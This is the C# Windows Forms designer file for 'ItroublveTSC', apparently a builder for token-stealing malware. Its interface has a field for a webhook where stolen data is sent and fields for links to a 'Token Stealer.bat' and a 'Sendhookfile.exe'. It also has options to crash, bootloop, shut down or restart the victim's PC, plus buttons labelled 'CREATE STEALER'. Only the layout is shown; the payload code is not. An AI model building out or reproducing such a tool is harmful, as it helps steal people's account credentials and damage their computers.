namespace ItroublveTSC
{
    public partial class frmMain : global::System.Windows.Forms.Form
    {
        protected override void Dispose(bool disposing)
        {
            bool flag = disposing && this.components != null;
            if (flag)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMain));
            this.RainbowTimer = new System.Windows.Forms.Timer(this.components);
            this.HeadLinePnlInf = new System.Windows.Forms.Panel();
            this.pnlRainbowTop = new System.Windows.Forms.Panel();
            this.CloseBtn = new System.Windows.Forms.Button();
            this.HeadServerLbl = new System.Windows.Forms.Label();
            this.panel25 = new System.Windows.Forms.Panel();
            this.comboBox3 = new System.Windows.Forms.ComboBox();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.button4 = new System.Windows.Forms.Button();
            this.panel26 = new System.Windows.Forms.Panel();
            this.panel27 = new System.Windows.Forms.Panel();
            this.panel36 = new System.Windows.Forms.Panel();
            this.PnlRainbowDown = new System.Windows.Forms.Panel();
            this.WebhookPnl = new System.Windows.Forms.Panel();
            this.WebHookTxt = new System.Windows.Forms.TextBox();
            this.WinInfo = new System.Windows.Forms.NotifyIcon(this.components);
            this.FinalresbatPnl = new System.Windows.Forms.Panel();
            this.FinalresbatTxt = new System.Windows.Forms.TextBox();
            this.SendhookfilePnl = new System.Windows.Forms.Panel();
            this.SendhookfileTxt = new System.Windows.Forms.TextBox();
            this.CrashPCchkbox = new System.Windows.Forms.CheckBox();
            this.CheckboxPnl = new System.Windows.Forms.Panel();
            this.CustomEXEchkbox = new System.Windows.Forms.CheckBox();
            this.BootloopPCchckbox = new System.Windows.Forms.CheckBox();
            this.AutoRmvExe = new System.Windows.Forms.CheckBox();
            this.ShutdownPCchkbox = new System.Windows.Forms.CheckBox();
            this.RestartPCchkbox = new System.Windows.Forms.CheckBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.CustomExeTxt = new System.Windows.Forms.TextBox();
            this.roundBtn1 = new RoundBtn();
            this.CreateTokenStealerBtn = new RoundBtn();
            this.CreateSendhookfileBtn = new RoundBtn();
            this.HeadLinePnlInf.SuspendLayout();
            this.WebhookPnl.SuspendLayout();
            this.FinalresbatPnl.SuspendLayout();
            this.SendhookfilePnl.SuspendLayout();
            this.CheckboxPnl.SuspendLayout();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // RainbowTimer
            // 
            this.RainbowTimer.Tick += new System.EventHandler(this.RainbowTimer_Tick);
            // 
            // HeadLinePnlInf
            // 
            this.HeadLinePnlInf.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.HeadLinePnlInf.Controls.Add(this.pnlRainbowTop);
            this.HeadLinePnlInf.Controls.Add(this.CloseBtn);
            this.HeadLinePnlInf.Controls.Add(this.HeadServerLbl);
            this.HeadLinePnlInf.Controls.Add(this.panel25);
            this.HeadLinePnlInf.Controls.Add(this.comboBox3);
            this.HeadLinePnlInf.Controls.Add(this.textBox3);
            this.HeadLinePnlInf.Controls.Add(this.button4);
            this.HeadLinePnlInf.Controls.Add(this.panel26);
            this.HeadLinePnlInf.Controls.Add(this.panel27);
            this.HeadLinePnlInf.Controls.Add(this.panel36);
            this.HeadLinePnlInf.Dock = System.Windows.Forms.DockStyle.Top;
            this.HeadLinePnlInf.Location = new System.Drawing.Point(0, 0);
            this.HeadLinePnlInf.Name = "HeadLinePnlInf";
            this.HeadLinePnlInf.Size = new System.Drawing.Size(421, 27);
            this.HeadLinePnlInf.TabIndex = 6306;
            // 
            // pnlRainbowTop
            // 
            this.pnlRainbowTop.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.pnlRainbowTop.Location = new System.Drawing.Point(12, 24);
            this.pnlRainbowTop.Name = "pnlRainbowTop";
            this.pnlRainbowTop.Size = new System.Drawing.Size(396, 2);
            this.pnlRainbowTop.TabIndex = 6222;
            // 
            // CloseBtn
            // 
            this.CloseBtn.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.CloseBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CloseBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(110)))), ((int)(((byte)(123)))));
            this.CloseBtn.FlatAppearance.BorderSize = 0;
            this.CloseBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CloseBtn.Font = new System.Drawing.Font("Webdings", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(2)));
            this.CloseBtn.ForeColor = System.Drawing.Color.White;
            this.CloseBtn.Location = new System.Drawing.Point(395, -1);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.Size = new System.Drawing.Size(26, 25);
            this.CloseBtn.TabIndex = 6167;
            this.CloseBtn.Text = "r";
            this.CloseBtn.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.CloseBtn.UseVisualStyleBackColor = false;
            this.CloseBtn.Click += new System.EventHandler(this.CloseBtn_Click);
            // 
            // HeadServerLbl
            // 
            this.HeadServerLbl.AutoSize = true;
            this.HeadServerLbl.Font = new System.Drawing.Font("Microsoft Tai Le", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HeadServerLbl.ForeColor = System.Drawing.Color.White;
            this.HeadServerLbl.Location = new System.Drawing.Point(154, 3);
            this.HeadServerLbl.Name = "HeadServerLbl";
            this.HeadServerLbl.Size = new System.Drawing.Size(108, 21);
            this.HeadServerLbl.TabIndex = 6166;
            this.HeadServerLbl.Text = "ItroublveTSC";
            this.HeadServerLbl.MouseDown += new System.Windows.Forms.MouseEventHandler(this.HeadServerLbl_MouseDown);
            this.HeadServerLbl.MouseMove += new System.Windows.Forms.MouseEventHandler(this.HeadServerLbl_MouseMove);
            // 
            // panel25
            // 
            this.panel25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel25.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel25.Location = new System.Drawing.Point(362, -44);
            this.panel25.Name = "panel25";
            this.panel25.Size = new System.Drawing.Size(2, 25);
            this.panel25.TabIndex = 6160;
            // 
            // comboBox3
            // 
            this.comboBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.comboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox3.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold);
            this.comboBox3.ForeColor = System.Drawing.Color.Silver;
            this.comboBox3.FormattingEnabled = true;
            this.comboBox3.Location = new System.Drawing.Point(364, -44);
            this.comboBox3.Name = "comboBox3";
            this.comboBox3.Size = new System.Drawing.Size(254, 25);
            this.comboBox3.TabIndex = 6154;
            // 
            // textBox3
            // 
            this.textBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox3.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox3.ForeColor = System.Drawing.Color.White;
            this.textBox3.Location = new System.Drawing.Point(364, -42);
            this.textBox3.Multiline = true;
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new System.Drawing.Size(231, 21);
            this.textBox3.TabIndex = 6156;
            this.textBox3.Text = " Voice Channel";
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(68)))), ((int)(((byte)(173)))));
            this.button4.FlatAppearance.BorderSize = 0;
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Webdings", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(2)));
            this.button4.ForeColor = System.Drawing.Color.Silver;
            this.button4.Location = new System.Drawing.Point(594, -43);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(25, 22);
            this.button4.TabIndex = 6155;
            this.button4.Text = "6";
            this.button4.UseVisualStyleBackColor = false;
            // 
            // panel26
            // 
            this.panel26.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel26.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel26.Location = new System.Drawing.Point(364, -21);
            this.panel26.Name = "panel26";
            this.panel26.Size = new System.Drawing.Size(254, 2);
            this.panel26.TabIndex = 6157;
            // 
            // panel27
            // 
            this.panel27.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel27.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel27.Location = new System.Drawing.Point(364, -44);
            this.panel27.Name = "panel27";
            this.panel27.Size = new System.Drawing.Size(254, 2);
            this.panel27.TabIndex = 6158;
            // 
            // panel36
            // 
            this.panel36.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel36.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel36.Location = new System.Drawing.Point(617, -44);
            this.panel36.Name = "panel36";
            this.panel36.Size = new System.Drawing.Size(2, 25);
            this.panel36.TabIndex = 6159;
            // 
            // PnlRainbowDown
            // 
            this.PnlRainbowDown.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.PnlRainbowDown.Location = new System.Drawing.Point(-1631, 430);
            this.PnlRainbowDown.Name = "PnlRainbowDown";
            this.PnlRainbowDown.Size = new System.Drawing.Size(3814, 2);
            this.PnlRainbowDown.TabIndex = 6307;
            // 
            // WebhookPnl
            // 
            this.WebhookPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebhookPnl.Controls.Add(this.WebHookTxt);
            this.WebhookPnl.Location = new System.Drawing.Point(13, 47);
            this.WebhookPnl.Name = "WebhookPnl";
            this.WebhookPnl.Size = new System.Drawing.Size(395, 33);
            this.WebhookPnl.TabIndex = 6308;
            // 
            // WebHookTxt
            // 
            this.WebHookTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebHookTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.WebHookTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.WebHookTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.WebHookTxt.Location = new System.Drawing.Point(7, 7);
            this.WebHookTxt.Name = "WebHookTxt";
            this.WebHookTxt.Size = new System.Drawing.Size(379, 18);
            this.WebHookTxt.TabIndex = 6153;
            this.WebHookTxt.Text = "WebHook Here";
            // 
            // WinInfo
            // 
            this.WinInfo.BalloonTipTitle = "ItroublveTSC";
            this.WinInfo.Visible = true;
            // 
            // FinalresbatPnl
            // 
            this.FinalresbatPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.FinalresbatPnl.Controls.Add(this.FinalresbatTxt);
            this.FinalresbatPnl.Location = new System.Drawing.Point(12, 92);
            this.FinalresbatPnl.Name = "FinalresbatPnl";
            this.FinalresbatPnl.Size = new System.Drawing.Size(395, 33);
            this.FinalresbatPnl.TabIndex = 6321;
            // 
            // FinalresbatTxt
            // 
            this.FinalresbatTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.FinalresbatTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.FinalresbatTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FinalresbatTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.FinalresbatTxt.Location = new System.Drawing.Point(7, 7);
            this.FinalresbatTxt.Name = "FinalresbatTxt";
            this.FinalresbatTxt.Size = new System.Drawing.Size(379, 18);
            this.FinalresbatTxt.TabIndex = 6153;
            this.FinalresbatTxt.Text = "Token Stealer.bat Link Here";
            // 
            // SendhookfilePnl
            // 
            this.SendhookfilePnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.SendhookfilePnl.Controls.Add(this.SendhookfileTxt);
            this.SendhookfilePnl.Location = new System.Drawing.Point(12, 139);
            this.SendhookfilePnl.Name = "SendhookfilePnl";
            this.SendhookfilePnl.Size = new System.Drawing.Size(395, 32);
            this.SendhookfilePnl.TabIndex = 6324;
            // 
            // SendhookfileTxt
            // 
            this.SendhookfileTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.SendhookfileTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.SendhookfileTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SendhookfileTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.SendhookfileTxt.Location = new System.Drawing.Point(7, 7);
            this.SendhookfileTxt.Name = "SendhookfileTxt";
            this.SendhookfileTxt.Size = new System.Drawing.Size(379, 18);
            this.SendhookfileTxt.TabIndex = 6153;
            this.SendhookfileTxt.Text = "Sendhookfile.exe Link Here";
            // 
            // CrashPCchkbox
            // 
            this.CrashPCchkbox.AccessibleName = "CrashPCchkbox";
            this.CrashPCchkbox.AutoSize = true;
            this.CrashPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.CrashPCchkbox.Location = new System.Drawing.Point(10, 8);
            this.CrashPCchkbox.Name = "CrashPCchkbox";
            this.CrashPCchkbox.Size = new System.Drawing.Size(70, 17);
            this.CrashPCchkbox.TabIndex = 6328;
            this.CrashPCchkbox.Text = "Crash PC";
            this.CrashPCchkbox.UseVisualStyleBackColor = true;
            // 
            // CheckboxPnl
            // 
            this.CheckboxPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.CheckboxPnl.Controls.Add(this.CustomEXEchkbox);
            this.CheckboxPnl.Controls.Add(this.BootloopPCchckbox);
            this.CheckboxPnl.Controls.Add(this.AutoRmvExe);
            this.CheckboxPnl.Controls.Add(this.ShutdownPCchkbox);
            this.CheckboxPnl.Controls.Add(this.RestartPCchkbox);
            this.CheckboxPnl.Controls.Add(this.CrashPCchkbox);
            this.CheckboxPnl.Location = new System.Drawing.Point(13, 232);
            this.CheckboxPnl.Name = "CheckboxPnl";
            this.CheckboxPnl.Size = new System.Drawing.Size(252, 121);
            this.CheckboxPnl.TabIndex = 6329;
            // 
            // CustomEXEchkbox
            // 
            this.CustomEXEchkbox.AccessibleName = "CustomExechkbox";
            this.CustomEXEchkbox.AutoSize = true;
            this.CustomEXEchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.CustomEXEchkbox.Location = new System.Drawing.Point(148, 77);
            this.CustomEXEchkbox.Name = "CustomEXEchkbox";
            this.CustomEXEchkbox.Size = new System.Drawing.Size(85, 17);
            this.CustomEXEchkbox.TabIndex = 6334;
            this.CustomEXEchkbox.Text = "Custom EXE";
            this.CustomEXEchkbox.UseVisualStyleBackColor = true;
            this.CustomEXEchkbox.CheckedChanged += new System.EventHandler(this.CustomEXEchkbox_CheckedChanged);
            // 
            // BootloopPCchckbox
            // 
            this.BootloopPCchckbox.AccessibleName = "BootloopPCchkbox";
            this.BootloopPCchckbox.AutoSize = true;
            this.BootloopPCchckbox.ForeColor = System.Drawing.SystemColors.Window;
            this.BootloopPCchckbox.Location = new System.Drawing.Point(10, 77);
            this.BootloopPCchckbox.Name = "BootloopPCchckbox";
            this.BootloopPCchckbox.Size = new System.Drawing.Size(85, 17);
            this.BootloopPCchckbox.TabIndex = 6333;
            this.BootloopPCchckbox.Text = "Bootloop PC";
            this.BootloopPCchckbox.UseVisualStyleBackColor = true;
            this.BootloopPCchckbox.CheckedChanged += new System.EventHandler(this.BootloopPCchckbox_CheckedChanged);
            // 
            // AutoRmvExe
            // 
            this.AutoRmvExe.AccessibleName = "CrashPCchkbox";
            this.AutoRmvExe.AutoSize = true;
            this.AutoRmvExe.ForeColor = System.Drawing.SystemColors.Window;
            this.AutoRmvExe.Location = new System.Drawing.Point(9, 41);
            this.AutoRmvExe.Name = "AutoRmvExe";
            this.AutoRmvExe.Size = new System.Drawing.Size(115, 17);
            this.AutoRmvExe.TabIndex = 6332;
            this.AutoRmvExe.Text = "Auto Remove EXE";
            this.AutoRmvExe.UseVisualStyleBackColor = true;
            // 
            // ShutdownPCchkbox
            // 
            this.ShutdownPCchkbox.AccessibleName = "ShutdownPCchkbox";
            this.ShutdownPCchkbox.AutoSize = true;
            this.ShutdownPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.ShutdownPCchkbox.Location = new System.Drawing.Point(148, 41);
            this.ShutdownPCchkbox.Name = "ShutdownPCchkbox";
            this.ShutdownPCchkbox.Size = new System.Drawing.Size(91, 17);
            this.ShutdownPCchkbox.TabIndex = 6330;
            this.ShutdownPCchkbox.Text = "Shutdown PC";
            this.ShutdownPCchkbox.UseVisualStyleBackColor = true;
            // 
            // RestartPCchkbox
            // 
            this.RestartPCchkbox.AccessibleName = "RestartPCchkbox";
            this.RestartPCchkbox.AutoSize = true;
            this.RestartPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.RestartPCchkbox.Location = new System.Drawing.Point(148, 8);
            this.RestartPCchkbox.Name = "RestartPCchkbox";
            this.RestartPCchkbox.Size = new System.Drawing.Size(77, 17);
            this.RestartPCchkbox.TabIndex = 6329;
            this.RestartPCchkbox.Text = "Restart PC";
            this.RestartPCchkbox.UseVisualStyleBackColor = true;
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.panel1.Controls.Add(this.CustomExeTxt);
            this.panel1.Location = new System.Drawing.Point(12, 185);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(395, 32);
            this.panel1.TabIndex = 6331;
            // 
            // CustomExeTxt
            // 
            this.CustomExeTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.CustomExeTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.CustomExeTxt.Enabled = false;
            this.CustomExeTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.CustomExeTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.CustomExeTxt.Location = new System.Drawing.Point(7, 7);
            this.CustomExeTxt.Name = "CustomExeTxt";
            this.CustomExeTxt.Size = new System.Drawing.Size(379, 18);
            this.CustomExeTxt.TabIndex = 6153;
            this.CustomExeTxt.Text = "Custom EXE Link Here";
            // 
            // roundBtn1
            // 
            this.roundBtn1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.roundBtn1.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.roundBtn1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.roundBtn1.FlatAppearance.BorderSize = 0;
            this.roundBtn1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.roundBtn1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.roundBtn1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.roundBtn1.Font = new System.Drawing.Font("Segoe UI Black", 13F, System.Drawing.FontStyle.Bold);
            this.roundBtn1.Location = new System.Drawing.Point(274, 232);
            this.roundBtn1.Name = "roundBtn1";
            this.roundBtn1.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.roundBtn1.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.roundBtn1.OnHoverTextColor = System.Drawing.Color.White;
            this.roundBtn1.Size = new System.Drawing.Size(133, 132);
            this.roundBtn1.TabIndex = 6330;
            this.roundBtn1.Text = "How To Use?";
            this.roundBtn1.TextColor = System.Drawing.Color.White;
            this.roundBtn1.UseVisualStyleBackColor = true;
            this.roundBtn1.Click += new System.EventHandler(this.roundBtn1_Click_1);
            // 
            // CreateTokenStealerBtn
            // 
            this.CreateTokenStealerBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateTokenStealerBtn.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateTokenStealerBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatAppearance.BorderSize = 0;
            this.CreateTokenStealerBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CreateTokenStealerBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
            this.CreateTokenStealerBtn.Location = new System.Drawing.Point(249, 385);
            this.CreateTokenStealerBtn.Name = "CreateTokenStealerBtn";
            this.CreateTokenStealerBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateTokenStealerBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateTokenStealerBtn.OnHoverTextColor = System.Drawing.Color.White;
            this.CreateTokenStealerBtn.Size = new System.Drawing.Size(158, 27);
            this.CreateTokenStealerBtn.TabIndex = 6326;
            this.CreateTokenStealerBtn.Text = "CREATE STEALER";
            this.CreateTokenStealerBtn.TextColor = System.Drawing.Color.White;
            this.CreateTokenStealerBtn.UseVisualStyleBackColor = true;
            this.CreateTokenStealerBtn.Click += new System.EventHandler(this.roundBtn1_Click);
            // 
            // CreateSendhookfileBtn
            // 
            this.CreateSendhookfileBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateSendhookfileBtn.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateSendhookfileBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateSendhookfileBtn.FlatAppearance.BorderSize = 0;
            this.CreateSendhookfileBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateSendhookfileBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateSendhookfileBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CreateSendhookfileBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
            this.CreateSendhookfileBtn.Location = new System.Drawing.Point(12, 385);
            this.CreateSendhookfileBtn.Name = "CreateSendhookfileBtn";
            this.CreateSendhookfileBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateSendhookfileBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateSendhookfileBtn.OnHoverTextColor = System.Drawing.Color.White;
            this.CreateSendhookfileBtn.Size = new System.Drawing.Size(148, 27);
            this.CreateSendhookfileBtn.TabIndex = 6320;
            this.CreateSendhookfileBtn.Text = "CREATE STEALER FILES";
            this.CreateSendhookfileBtn.TextColor = System.Drawing.Color.White;
            this.CreateSendhookfileBtn.UseVisualStyleBackColor = true;
            this.CreateSendhookfileBtn.Click += new System.EventHandler(this.CreateBtn_Click);
            // 
            // frmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.ClientSize = new System.Drawing.Size(421, 444);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.roundBtn1);
            this.Controls.Add(this.CheckboxPnl);
            this.Controls.Add(this.CreateTokenStealerBtn);
            this.Controls.Add(this.SendhookfilePnl);
            this.Controls.Add(this.FinalresbatPnl);
            this.Controls.Add(this.CreateSendhookfileBtn);
            this.Controls.Add(this.WebhookPnl);
            this.Controls.Add(this.PnlRainbowDown);
            this.Controls.Add(this.HeadLinePnlInf);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "frmMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "ItroublveTSC";
            this.Load += new System.EventHandler(this.frmMain_Load);
            this.HeadLinePnlInf.ResumeLayout(false);
            this.HeadLinePnlInf.PerformLayout();
            this.WebhookPnl.ResumeLayout(false);
            this.WebhookPnl.PerformLayout();
            this.FinalresbatPnl.ResumeLayout(false);
            this.FinalresbatPnl.PerformLayout();
            this.SendhookfilePnl.ResumeLayout(false);
            this.SendhookfilePnl.PerformLayout();
            this.CheckboxPnl.ResumeLayout(false);
            this.CheckboxPnl.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);

        }

        private global::System.ComponentModel.IContainer components = null;

        private global::System.Windows.Forms.Timer RainbowTimer;

        private global::System.Windows.Forms.Panel HeadLinePnlInf;

        private global::System.Windows.Forms.Panel pnlRainbowTop;

        private global::System.Windows.Forms.Button CloseBtn;

        private global::System.Windows.Forms.Label HeadServerLbl;

        private global::System.Windows.Forms.Panel panel25;

        private global::System.Windows.Forms.ComboBox comboBox3;

        private global::System.Windows.Forms.TextBox textBox3;

        private global::System.Windows.Forms.Button button4;

        private global::System.Windows.Forms.Panel panel26;

        private global::System.Windows.Forms.Panel panel27;

        private global::System.Windows.Forms.Panel panel36;

        private global::System.Windows.Forms.Panel PnlRainbowDown;

        private global::System.Windows.Forms.Panel WebhookPnl;

        private global::System.Windows.Forms.TextBox WebHookTxt;

        private global::RoundBtn CreateSendhookfileBtn;

        private global::System.Windows.Forms.NotifyIcon WinInfo;
        private System.Windows.Forms.Panel FinalresbatPnl;
        private System.Windows.Forms.TextBox FinalresbatTxt;
        private System.Windows.Forms.Panel SendhookfilePnl;
        private System.Windows.Forms.TextBox SendhookfileTxt;
        private RoundBtn CreateTokenStealerBtn;
        private System.Windows.Forms.CheckBox CrashPCchkbox;
        private System.Windows.Forms.Panel CheckboxPnl;
        private RoundBtn roundBtn1;
        private System.Windows.Forms.CheckBox RestartPCchkbox;
        private System.Windows.Forms.CheckBox BootloopPCchckbox;
        private System.Windows.Forms.CheckBox AutoRmvExe;
        private System.Windows.Forms.CheckBox ShutdownPCchkbox;
        private System.Windows.Forms.CheckBox CustomEXEchkbox;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.TextBox CustomExeTxt;
    }
}
